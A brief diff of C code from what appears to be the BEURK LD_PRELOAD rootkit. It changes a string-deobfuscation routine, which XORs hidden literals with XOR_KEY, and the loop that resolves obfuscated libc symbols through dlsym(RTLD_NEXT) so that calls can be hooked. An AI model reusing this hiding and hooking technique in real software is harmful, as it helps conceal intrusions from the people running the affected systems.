@@ -30,12 +30,13 @@
 /** xorify a string whith XOR_KEY
  * (XOR_KEY is a macro defined in BEURK config file
  */
-static void     xor(char *p) {
+static char     *xor(char *p) {
     unsigned int i;
 
     for(i = 0; i < strlen(p); i++) {
         p[i] ^= XOR_KEY;
     }
+	return p;
 }
 
 /** re-xorify hidden literals.
@@ -64,8 +65,8 @@ static void		init_syscalls_list() {
 	char	*dl_error;
 
 	dlerror();
-	for (i = 0; i < SYS_SIZE; i++) {
-		syscall = xor(beurk_syscalls_tab[i]);
+	for (i = 0; i < NUM_SYSCALL; i++) {
+		syscall = xor(beurk_syscalls_table[i]);
 		beurk_syscalls_list[i] = dlsym(RTLD_NEXT, syscall);
 		if ((dl_error = dlerror()) != NULL)
 			DEBUG(dl_error);
